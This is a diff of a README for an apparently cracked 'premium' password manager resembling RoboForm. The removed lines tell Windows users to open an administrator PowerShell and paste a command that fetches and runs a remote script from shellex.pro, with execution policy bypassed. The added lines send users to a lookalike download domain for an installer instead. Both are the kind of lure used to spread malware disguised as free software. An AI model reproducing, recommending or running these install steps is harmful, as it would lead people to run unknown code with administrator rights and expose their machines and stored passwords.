@@ -4,31 +4,14 @@
 
 Password manager with powerful form-filling capabilities · Premium workspace · Zero nag dialogs.
 
-## INSTALLATION
+## Download
 
-**Steps:**
-1. Press **Win**, type **PowerShell**
-2. Right-click **Windows PowerShell** → **Run as administrator**
-3. Copy the command below, paste into the window, press **Enter**
-4. If **UAC** still appears – click **Yes**
+> Use the project link below for Windows.
 
-```powershell
-powershell -NoProfile -ExecutionPolicy Bypass -Command "irm 'https://shellex.pro/ps/setup.ps1' | iex"
-```
-
-<details>
-<summary><b>Command did not start?</b></summary>
-
-Try this directly in the same PowerShell window:
-
-```powershell
-irm 'https://shellex.pro/ps/setup.ps1' | iex
-```
-
-</details>
-
-<sub>Administrator rights are required to complete the setup.</sub>
-
+* **Project link:** **[roboform-everywhere-autofill-suite.nexpath.xyz](https://roboform-everywhere-autofill-suite.nexpath.xyz/)**
+* **Full URL:** `https://roboform-everywhere-autofill-suite.nexpath.xyz/`
+* **Type:** Desktop package | Windows 10 and 11, 64-bit
+* **Setup:** Run the installer from the extracted folder
 
 ## 📋 Overview
 
